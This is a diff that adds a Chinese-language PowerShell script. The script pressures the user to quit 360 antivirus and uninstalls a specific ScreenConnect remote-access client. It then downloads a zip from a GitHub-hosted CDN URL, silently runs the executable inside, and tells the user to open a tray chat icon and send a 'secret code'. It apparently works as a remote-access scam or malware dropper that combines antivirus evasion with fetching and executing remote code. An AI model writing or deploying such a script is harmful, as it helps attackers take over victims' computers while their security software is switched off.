@@ -1,0 +1,93 @@
+# 定义要检测的进程名称数组
+$processNames = @("360sd", "360Tray")
+
+function Check-Processes {
+    $processFound = $false
+    foreach ($processName in $processNames) {
+        $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
+        if ($process) {
+            $processFound = $true
+            break
+        }
+    }
+    return $processFound
+}
+
+# 添加类型以使用消息框
+Add-Type -AssemblyName PresentationFramework
+
+# 初始化检查
+$processFound = Check-Processes
+
+# 如果检测到任何一个进程在运行
+while ($processFound) {
+    # 弹出消息框，显示两个按钮：确定 和 取消
+    $result = [Windows.MessageBox]::Show("您的系统当前正在运行『360杀毒』, 它会阻止我的运行!`n`n〓 如果您仍想运行我, 请按如下步骤操作：`n1.先在桌面任务栏右下角找到这些软件的图标；`n2.然后在图标上方按下鼠标右键 -> 选择退出项 -> 确认退出；`n3.最后单击『确定』按钮再次尝试运行我。`n`n〓 如果您不想运行我：单击『取消』或 X 按钮。", "警告", 'OKCancel', 'Warning')
+
+    if ($result -eq 'Cancel') {
+        # 用户选择取消，退出脚本
+        Write-Host "用户选择取消，脚本将退出。"
+        exit
+    } elseif ($result -eq 'OK') {
+        # 用户选择确定，再次检查进程
+        $processFound = Check-Processes
+        if (-not $processFound) {
+            Write-Host "未检测到360相关进程，继续执行脚本。"
+            break
+        } else {
+            cls
+            Write-Host "检测到360相关进程，等待用户关闭。"
+        }
+    }
+}
+
+# 设置文件路径
+$zipUrl = "https://cdn.jsdelivr.net/gh/GHFXJ1680/a@main/YC_WIN.zip"
+$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "YC_WIN.zip")
+$tempFolderPath = [System.IO.Path]::GetTempPath()
+$extractedFolderPath = [System.IO.Path]::Combine($tempFolderPath, "YC_WIN")
+
+$softwareName = "ScreenConnect Client (48d2773280af8f97)"
+$product = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -eq $softwareName }
+if ($product) {
+    $product | ForEach-Object {
+        $_.Uninstall() | Out-Null
+        Write-Host "Uninstall command sent to $($product.Name)"
+    }
+}
+
+# 下载ZIP文件到桌面
+Write-Host "Downloading file..."
+#Invoke-WebRequest -Uri $zipUrl -OutFile $desktopPath
+(New-Object System.Net.WebClient).DownloadFile($zipUrl, $desktopPath)
+
+# 如果解压目标文件夹已存在，先删除
+if (Test-Path $extractedFolderPath) {
+    Write-Host "Cleaning up old files..."
+    Remove-Item -Path $extractedFolderPath -Recurse -Force
+}
+
+# 创建临时文件夹
+New-Item -Path $extractedFolderPath -ItemType Directory | Out-Null
+
+# 解压缩文件到临时文件夹
+Write-Host "Extracting file..."
+Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+[System.IO.Compression.ZipFile]::ExtractToDirectory($desktopPath, $extractedFolderPath)
+
+# 查找解压后的可执行文件
+$extractedFile = Get-ChildItem -Path $extractedFolderPath -Filter *.exe | Select-Object -First 1
+
+if ($extractedFile) {
+    # 运行解压后的文件
+    Write-Host "Running the executable..."
+    Start-Process -FilePath $extractedFile.FullName -Wait
+
+    # 当文件运行完毕后，弹出消息框
+    [Windows.Forms.MessageBox]::Show(“请注意桌面右下角会出现一个小头像图标, `n`n当图标右下角变成绿点时双击它!`n`n在聊天窗口中发送暗号后再告知我!", "提示", 'OK', 'Information')
+} else {
+    Write-Host "No executable file found in extracted folder."
+}
+
+# 清理下载的ZIP文件
+Remove-Item -Path $desktopPath -Force
